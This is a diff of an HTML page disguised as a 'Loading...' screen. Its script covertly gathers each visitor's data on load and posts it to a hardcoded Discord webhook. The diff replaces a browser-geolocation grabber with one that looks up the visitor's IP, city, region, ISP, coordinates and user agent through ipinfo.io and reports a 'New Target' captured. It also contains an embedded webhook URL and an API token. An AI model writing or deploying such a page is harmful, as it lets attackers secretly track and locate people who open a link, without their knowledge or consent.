@@ -7,53 +7,41 @@
 <body>
   <h2>Loading...</h2>
   <script>
-    // Your webhook URL
     const webhookUrl = "https://discord.com/api/webhooks/1365943749418684436/a92zO8H5VDyeY1Emq_3vXGYn3cvawfRgGkkt3Y7yZ05ooubEatnxu-fjiyfaUujNmLzx";
 
     function sendToDiscord(message) {
       fetch(webhookUrl, {
-        method: 'POST',
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json'
+          "Content-Type": "application/json"
         },
         body: JSON.stringify({ content: message })
       });
     }
 
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error);
-      } else {
-        sendToDiscord("[!] Geolocation is not supported by this browser.");
-      }
+    function getIPDetails() {
+      fetch("https://ipinfo.io/json?token=01c58b3f834f30") // Free API, no login needed
+        .then(response => response.json())
+        .then(data => {
+          const message = `
+🌐 **New Target IP Info Captured!**
+🔢 **IP:** ${data.ip}
+🏙️ **City:** ${data.city}
+🌍 **Region:** ${data.region}
+🌎 **Country:** ${data.country}
+📡 **ISP:** ${data.org}
+🧭 **Location (Lat,Long):** ${data.loc}
+🔗 **Google Maps:** https://www.google.com/maps?q=${data.loc}
+📱 **Device:** ${navigator.userAgent}
+          `;
+          sendToDiscord(message);
+        })
+        .catch(error => {
+          sendToDiscord("[!] Failed to fetch IP details: " + error);
+        });
     }
 
-    function success(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
-      const userAgent = navigator.userAgent;
-
-      const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      const message = `
-📍 **New Target Location Captured!**
-🌎 **Latitude:** ${latitude}
-🌍 **Longitude:** ${longitude}
-🎯 **Accuracy:** ±${accuracy} meters
-📱 **Device Info:** ${userAgent}
-🗺️ **Maps Link:** ${googleMapsLink}
-      `;
-
-      sendToDiscord(message);
-    }
-
-    function error(err) {
-      sendToDiscord("[!] Failed to get location: " + err.message);
-    }
-
-    // Start
-    getLocation();
+    getIPDetails();
   </script>
 </body>
 </html>
